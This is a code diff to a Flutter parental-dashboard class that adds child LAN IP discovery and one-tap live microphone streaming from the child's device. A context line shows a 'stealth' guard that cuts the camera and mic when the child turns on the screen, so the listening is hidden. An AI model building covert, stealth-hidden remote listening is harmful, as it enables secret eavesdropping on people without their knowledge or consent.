@@ -1703,6 +1703,33 @@ class ParentDashboardProvider extends ChangeNotifier {
   bool _isFlashlightOn = false;
   bool get isFlashlightOn => _isFlashlightOn;
 
+  // ── Child LAN IP (discovered via UDP broadcast, cached) ─────────────────
+  String? _childLanIp;
+  String? get childLanIp => _childLanIp;
+
+  void setChildLanIp(String ip) {
+    _childLanIp = ip;
+    notifyListeners();
+  }
+
+  // ── Live Audio streaming (one-tap, WAV over LAN) ─────────────────────────
+  bool _isLiveAudioActive = false;
+  bool get isLiveAudioActive => _isLiveAudioActive;
+
+  void startLiveAudio() {
+    _isLiveAudioActive = true;
+    _dispatchRemoteCommand('START_LIVE_AUDIO', {});
+    debugPrint('Dispatched START_LIVE_AUDIO to child');
+    notifyListeners();
+  }
+
+  void stopLiveAudio() {
+    _isLiveAudioActive = false;
+    _dispatchRemoteCommand('STOP_LIVE_AUDIO', {});
+    debugPrint('Dispatched STOP_LIVE_AUDIO to child');
+    notifyListeners();
+  }
+
   bool _isStealthScreenGuardEnabled = true; // Auto-cut camera/mic when child turns on screen
   bool get isStealthScreenGuardEnabled => _isStealthScreenGuardEnabled;
 
